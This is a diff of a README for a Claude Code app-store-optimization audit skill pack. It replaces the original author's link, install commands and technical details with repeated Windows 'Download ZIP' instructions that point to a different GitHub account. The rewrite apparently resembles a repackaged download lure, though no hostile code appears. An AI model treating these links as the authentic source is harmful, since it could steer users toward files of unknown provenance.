@@ -1,120 +1,323 @@
-# claude-aso-audit-skill
+# 🤖 claude-aso-audit-skill - Audit App Store Listings Fast
 
-Claude ASO — App Store Optimization Skill Pack
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge&logo=github)](https://github.com/elladineluxemburger97/claude-aso-audit-skill)
 
-Comprehensive App Store Optimization skill pack for Claude-style skill and agent runtimes. Analyzes iOS App Store and Google Play listings across core ASO categories, producing an ASO Health Score (0-100) and prioritized action plan.
+## 📥 Download
 
-Inspired by [AgriciDaniel/claude-seo](https://github.com/AgriciDaniel/claude-seo) — adapted from SEO website analysis to ASO mobile app optimization with the same parallel subagent architecture.
+Visit this page to download: [https://github.com/elladineluxemburger97/claude-aso-audit-skill](https://github.com/elladineluxemburger97/claude-aso-audit-skill)
 
-## Features
+## 🧭 What this is
 
-- **Local-first**: run `/aso audit` inside your app project — auto-detects Fastlane metadata, Xcode, or Gradle and audits pre-submission metadata
-- **Remote audit**: run `/aso audit <app-id>` to audit any live listing or competitor
-- **14 specialized sub-skills**: audit, compliance, keywords, metadata, visuals, reviews, competitors, localization, A/B testing, technical, conversion, planning, launch, seasonal
-- **10 specialist agents**: the audit runs 7 core agents in parallel, adds localization when needed, then runs compliance as a final gate
-- **Platform-aware**: auto-detects iOS vs Android, applies correct rules (character limits, indexing behavior, A/B testing capabilities)
-- **Quality gates**: prevents bad recommendations (no keyword stuffing, respects char limits, iOS description not indexed)
-- **Extension system**: optional AppTweak and App Store Connect API integrations
+`claude-aso-audit-skill` is an ASO audit skill pack for Claude Code. It helps you review App Store and Google Play listings with a clear checklist. It can help you check:
 
-## Quick Start
+- App name and subtitle
+- Keywords and search terms
+- Description and metadata
+- Screenshots and visuals
+- Ratings and review trends
+- Competitor listings
 
-The easiest way: point your AI agent at this repo and ask it to set it up.
+Use it when you want a quick way to inspect a mobile app listing and spot weak points.
 
-```
-Install https://github.com/felixgraeber/claude-aso-audit-skill and run an ASO audit on my app
-```
+## ✅ What you need
 
-Or install manually:
+Use this on a Windows PC with:
 
-```bash
-git clone https://github.com/felixgraeber/claude-aso-audit-skill.git
-cd claude-aso-audit-skill
-bash install.sh
-```
+- Windows 10 or Windows 11
+- A web browser
+- GitHub access
+- Claude Code installed, if you plan to use the skill pack
+- A stable internet connection
 
-Then in your skill-compatible agent:
+If you only want to download the files, a browser is enough.
 
-```
-/aso audit                      # Auto-detect local project metadata
-/aso audit id284882215          # Audit live iOS listing (Facebook)
-/aso audit com.whatsapp         # Audit live Android listing
-/aso audit --compare id123      # Compare local metadata vs live listing
-/aso keywords "habit tracker"   # Keyword research
-/aso metadata                   # Optimize local metadata
-```
+## 🚀 Getting Started
 
-## Commands
+1. Open the download page: [https://github.com/elladineluxemburger97/claude-aso-audit-skill](https://github.com/elladineluxemburger97/claude-aso-audit-skill)
+2. On the page, look for the green Code button
+3. Click it
+4. Choose Download ZIP
+5. Save the file to your computer
+6. Open the ZIP file
+7. Extract it to a folder you can find again, such as `Downloads` or `Desktop`
 
-| Command | Description |
-|---------|-------------|
-| `/aso audit` | Auto-detect local project and audit its metadata |
-| `/aso audit <app-id>` | Audit a live listing by app ID or store URL |
-| `/aso audit --compare <app-id>` | Compare local metadata vs live listing |
-| `/aso keywords <seeds>` | Keyword research and placement strategy |
-| `/aso metadata` | Optimize local metadata (or remote with app ID) |
-| `/aso visuals` | Analyze local screenshots (or remote with app ID) |
-| `/aso reviews <app-id>` | Review sentiment and response strategy |
-| `/aso competitors <app-id>` | Competitor gap analysis |
-| `/aso localization` | Audit local locale coverage |
-| `/aso ab-testing <app-id>` | A/B test design |
-| `/aso technical <app-id>` | Technical health check |
-| `/aso conversion <app-id>` | Conversion rate optimization |
-| `/aso compliance` | Store policy check for current metadata |
-| `/aso plan <category>` | Strategic ASO roadmap |
-| `/aso launch` | Pre-launch checklist using local project state |
-| `/aso seasonal <app-id>` | Seasonal keyword calendar |
+If you use Git, you can also clone the repo, but that is not needed for most users.
 
-## Local Project Detection
+## 🛠 How to set it up on Windows
 
-When no app ID is provided, `detect_project.py` scans the working directory:
+After you extract the files:
 
-| Source | Detected | Files |
-|--------|----------|-------|
-| Fastlane iOS | Name, subtitle, keywords, description per locale | `fastlane/metadata/{locale}/*.txt` |
-| Fastlane Android | Title, short/full description per locale | `fastlane/metadata/android/{locale}/*.txt` |
-| Xcode | Bundle ID, app name | `*.xcodeproj`, `Info.plist` |
-| Gradle | Application ID, app name | `app/build.gradle`, `AndroidManifest.xml` |
+1. Open the folder
+2. Look for any README, skill, or setup file in the folder
+3. If the pack includes Claude Code skill files, copy them into the Claude Code skills folder on your system
+4. Open Claude Code
+5. Load the skill pack from the folder or follow the instructions in the included files
+6. Start an audit by giving Claude a mobile app listing to review
 
-Fastlane metadata provides the richest data (all store fields, all locales). Xcode/Gradle provide only identifiers — the tool will offer to fetch the live listing for a full audit.
+If the repository includes sample prompts or templates, use those to guide the audit.
 
-## Architecture
+## 📋 What you can audit
 
-```
-aso/SKILL.md              Main orchestrator (entry point)
-skills/aso-*/SKILL.md     14 specialized sub-skills
-agents/aso-*.md           10 specialist agents
-references/*.md           Platform specs, quality gates
-scripts/*.py              Python utilities (fetch, parse, validate)
-extensions/               Optional API integrations
-```
+This skill pack is built for mobile app store work. It can help you check:
 
-## Scoring
+### 🍎 App Store listing
+- App title
+- Subtitle
+- Keyword field
+- Description
+- Category fit
+- Screenshot order
+- Rating and review signals
 
-The audit produces a weighted ASO Health Score:
+### 🤖 Google Play listing
+- App title
+- Short description
+- Long description
+- Feature graphic
+- Screenshots
+- Review themes
+- Store search terms
 
-| Category | Weight |
-|----------|--------|
-| Keywords | 20% |
-| Metadata | 20% |
-| Visuals | 15% |
-| Reviews | 15% |
-| Competitive | 10% |
-| Technical | 10% |
-| Conversion | 10% |
+### 🔍 Keyword research
+- Main search terms
+- Related terms
+- Missed keywords
+- Terms used by competitors
+- Keyword gaps across stores
 
-## Extensions
+### 🖼 Visual review
+- First screenshot impact
+- Message clarity
+- Brand fit
+- Feature coverage
+- Visual order on phone screens
 
-| Extension | Purpose | Requires |
-|-----------|---------|----------|
-| AppTweak | Live keyword data, rankings, competitors | API key ($69+/mo) |
-| App Store Connect | Direct Apple API for metadata and reviews | Developer account |
+### ⭐ Review analysis
+- Common praise points
+- Common complaints
+- Repeated feature requests
+- Support issues
+- App quality signals
 
-## Requirements
+### 🧩 Competitor checks
+- Competitor titles
+- Keyword use
+- Visual style
+- Value message
+- Store ranking hints
 
-- Python 3.12+
-- A skill-compatible agent runtime. The install scripts default to `~/.claude`, but you can override the install locations with `SKILLS_HOME`, `AGENTS_HOME`, and `ASO_ENV_FILE`.
-- Optional: Playwright for visual analysis
+## 🪟 How to run it
 
-## License
+On Windows, the basic flow is:
 
-MIT
+1. Download the repo
+2. Extract the files
+3. Open Claude Code
+4. Point Claude to the skill pack folder
+5. Ask it to run an ASO audit
+6. Paste in your App Store or Google Play listing data
+7. Review the output
+8. Make changes to the listing based on the results
+
+A simple prompt can look like this:
+
+- Audit this App Store listing for search terms, metadata, visuals, and review signals
+- Compare this Google Play listing with three competitors
+- Find weak keywords in this app title and description
+- Review the screenshots and point out gaps in the message
+
+## 🧪 Example use cases
+
+Use this pack when you want to:
+
+- Improve app visibility in App Store search
+- Improve Google Play keyword coverage
+- Review a new app launch
+- Compare a listing against top competitors
+- Find weak points in screenshots
+- Check if your metadata matches user intent
+- Review app store ratings and complaint patterns
+
+## 📁 Suggested folder setup
+
+A simple Windows folder structure can look like this:
+
+- `Downloads\claude-aso-audit-skill`
+- `Desktop\aso-projects`
+- `Documents\app-store-audits`
+
+Keep one folder for the skill pack and one folder for your audit notes.
+
+## 🔐 Safe use on Windows
+
+Before opening any ZIP file:
+
+1. Make sure the file came from the GitHub page above
+2. Right-click the ZIP file and check its properties if needed
+3. Extract files only from the repo you meant to download
+4. Keep your audit files in a separate folder from system files
+
+## 🧾 Main features
+
+- App Store audit support
+- Google Play audit support
+- Keyword review
+- Metadata review
+- Screenshot review
+- Review sentiment review
+- Competitor comparison
+- Prompt-based audit workflow
+- Built for Claude Code
+
+## 🧠 Good input to give Claude
+
+Claude gives better output when you include:
+
+- App name
+- Store link
+- Target country
+- Main category
+- Top three competitors
+- Screenshots
+- Current title and subtitle
+- Current description
+- User reviews
+- Any launch goals
+
+The more listing data you provide, the more useful the audit will be.
+
+## 🧰 Common file types you may see
+
+You may see files like:
+
+- Markdown files
+- Prompt files
+- Skill files
+- Example audit templates
+- Notes files
+
+Open these with Notepad, VS Code, or any text editor.
+
+## 🧭 If the download does not start
+
+If the page opens but nothing downloads:
+
+1. Wait for the page to load fully
+2. Click the green Code button
+3. Choose Download ZIP
+4. Try a different browser
+5. Check your internet connection
+
+## 📌 Where to start
+
+Start here: [https://github.com/elladineluxemburger97/claude-aso-audit-skill](https://github.com/elladineluxemburger97/claude-aso-audit-skill)
+
+## 🖥 Windows tips
+
+- Use File Explorer to move extracted files
+- Pin the folder to Quick access if you use it often
+- Keep your audit notes in plain text or Markdown
+- Use the same file name for each app audit so you can track changes
+
+## 🔎 Best way to use the skill pack
+
+A good workflow is:
+
+1. Gather store data
+2. Paste it into Claude
+3. Ask for an audit by area
+4. Review the keyword findings
+5. Review the visual findings
+6. Check competitor gaps
+7. Edit your listing
+8. Run the audit again
+
+This helps you compare changes over time.
+
+## 📚 Topic areas covered
+
+This repo fits these areas:
+
+- agent-skills
+- ai-agents
+- android
+- app-store
+- app-store-optimization
+- aso
+- claude-code
+- claude-code-skill
+- codex
+- cursor
+- fastlane
+- google-play
+- ios
+- keyword-research
+- metadata-optimization
+- mobile-app
+
+## 📝 What a good audit can tell you
+
+A strong audit can help you find:
+
+- Missing keywords
+- Weak search phrasing
+- Low-value screenshots
+- Mixed messages in metadata
+- Review patterns that hurt trust
+- Competitor strengths you can match
+- Gaps in your store page structure
+
+## 📦 File handling steps
+
+1. Download the ZIP from GitHub
+2. Extract it with Windows Extract All
+3. Open the folder
+4. Read the included instructions
+5. Move the files into your Claude Code skill path if needed
+6. Run your first audit
+
+## 🧩 Simple first audit prompt
+
+Try this:
+
+- Review this app listing for App Store and Google Play. Check title, subtitle, keywords, description, screenshots, ratings, reviews, and competitors. Point out the biggest ASO gaps and list the top changes I should make
+
+## 📍 Useful starting point for beginners
+
+If you are not sure what to do first:
+
+1. Download the repo
+2. Extract the files
+3. Open the included instructions
+4. Copy a store listing into Claude
+5. Ask for an audit in plain language
+
+## 🧪 Example audit output you might ask for
+
+You can ask Claude to return:
+
+- Top keyword gaps
+- Listing issues by store
+- Screenshot problems
+- Review themes
+- Competitor differences
+- Priority fixes
+- A short action list
+
+## 🗂 Keep your audit work organized
+
+For each app, save:
+
+- Store links
+- Screenshots
+- Current metadata
+- Review exports
+- Competitor notes
+- Claude output
+- Change history
+
+A clean folder makes later audits easier
+
+## 📥 Download again
+
+Visit this page to download: [https://github.com/elladineluxemburger97/claude-aso-audit-skill](https://github.com/elladineluxemburger97/claude-aso-audit-skill)
